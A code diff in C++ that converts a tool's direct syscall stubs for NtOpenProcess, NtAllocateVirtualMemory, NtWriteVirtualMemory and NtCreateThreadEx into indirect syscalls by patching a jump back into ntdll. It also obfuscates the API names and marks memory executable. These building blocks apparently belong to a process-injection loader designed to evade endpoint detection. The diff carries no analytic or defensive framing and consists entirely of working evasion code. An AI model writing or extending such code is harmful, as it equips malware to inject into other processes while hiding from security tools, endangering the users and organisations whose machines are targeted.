@@ -12,18 +12,19 @@
 using namespace std;
 
 int const SYSCALL_STUB_SIZE = 21;
+int const INDIRECT_SYSCALL_STUB_SIZE = 31;
 
 MyNtOpenProcess _NtOpenProcess = NULL;
-char OpenProcStub[SYSCALL_STUB_SIZE] = {};
+char OpenProcStub[INDIRECT_SYSCALL_STUB_SIZE] = {};
 
 MyNtAllocateVirtualMemory _NtAllocateVirtualMemory = NULL;
-char AllocStub[SYSCALL_STUB_SIZE] = {};
+char AllocStub[INDIRECT_SYSCALL_STUB_SIZE] = {};
 
 MyNtWriteVirtualMemory _NtWriteVirtualMemory = NULL;
-char WVMStub[SYSCALL_STUB_SIZE] = {};
+char WVMStub[INDIRECT_SYSCALL_STUB_SIZE] = {};
 
 MyNtCreateThreadEx _NtCreateThreadEx = NULL;
-char CreateThreadExStub[SYSCALL_STUB_SIZE];
+char CreateThreadExStub[INDIRECT_SYSCALL_STUB_SIZE];
 
 PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
 {
@@ -42,7 +43,21 @@ BOOL MapSyscall(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LP
 		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
 		if (strcmp(functionNameResolved, functionName) == 0)
 		{
-			memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
+			char stub[INDIRECT_SYSCALL_STUB_SIZE] = {};
+			memcpy(stub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
+			LPVOID jmp = (LPVOID)(functionVA + 0x12);
+			std::ostringstream oss;
+			oss << (void*)jmp;
+			std::string s(oss.str());
+			unsigned char jump_le[INDIRECT_SYSCALL_STUB_SIZE - SYSCALL_STUB_SIZE + 3 + 1] = "\x49\xBF\x00\x00\x00\x00\x00\x00\x00\x00\x41\xFF\xE7";
+			int j = 2;
+			for (int i = s.length() - 2; i >= 0; i = i - 2) {
+				int value = std::stoi(s.substr(i, 2), 0, 16);
+				jump_le[j] = value;
+				j++;
+			}
+			memcpy(stub + SYSCALL_STUB_SIZE - 3, (LPVOID)jump_le, INDIRECT_SYSCALL_STUB_SIZE - SYSCALL_STUB_SIZE + 3);
+			memcpy(syscallStub, stub, INDIRECT_SYSCALL_STUB_SIZE);
 			return TRUE;
 		}
 	}
@@ -54,7 +69,7 @@ BOOL FindOpenProc(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMA
 {
 	DWORD oldProtection;
 	_NtOpenProcess = (MyNtOpenProcess)(LPVOID)OpenProcStub;
-	BOOL status = VirtualProtect(OpenProcStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+	BOOL status = VirtualProtect(OpenProcStub, INDIRECT_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
 	if (MapSyscall(AY_OBFUSCATE("NtOpenProcess"), exportDirectory, fileData, textSection, rdataSection, OpenProcStub))
 	{
 		return TRUE;
@@ -82,7 +97,7 @@ BOOL FindAlloc(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_
 {
 	DWORD oldProtection;
 	_NtAllocateVirtualMemory = (MyNtAllocateVirtualMemory)(LPVOID)AllocStub;
-	VirtualProtect(AllocStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+	VirtualProtect(AllocStub, INDIRECT_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
 
 	if (MapSyscall(AY_OBFUSCATE("NtAllocateVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, AllocStub))
 	{
@@ -95,7 +110,7 @@ BOOL FindWriteVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID file
 {
 	DWORD oldProtection;
 	_NtWriteVirtualMemory = (MyNtWriteVirtualMemory)(LPVOID)WVMStub;
-	VirtualProtect(WVMStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+	VirtualProtect(WVMStub, INDIRECT_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
 
 	if (MapSyscall(AY_OBFUSCATE("NtWriteVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, WVMStub))
 	{
@@ -108,7 +123,7 @@ BOOL FindCreateThreadEx(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData
 {
 	DWORD oldProtection;
 	_NtCreateThreadEx = (MyNtCreateThreadEx)(LPVOID)CreateThreadExStub;
-	VirtualProtect(CreateThreadExStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+	VirtualProtect(CreateThreadExStub, INDIRECT_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
 
 	if (MapSyscall(AY_OBFUSCATE("NtCreateThreadEx"), exportDirectory, fileData, textSection, rdataSection, CreateThreadExStub))
 	{
@@ -149,6 +164,9 @@ BOOL EstablishSyscalls()
 	}
 
 	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);
+
+	DWORD oldProtection;
+	VirtualProtect(fileData, fileSize, PAGE_EXECUTE_READWRITE, &oldProtection);
 
 	// Assign Syscall values
 	if (!FindOpenProc(exportDirectory, fileData, textSection, rdataSection))
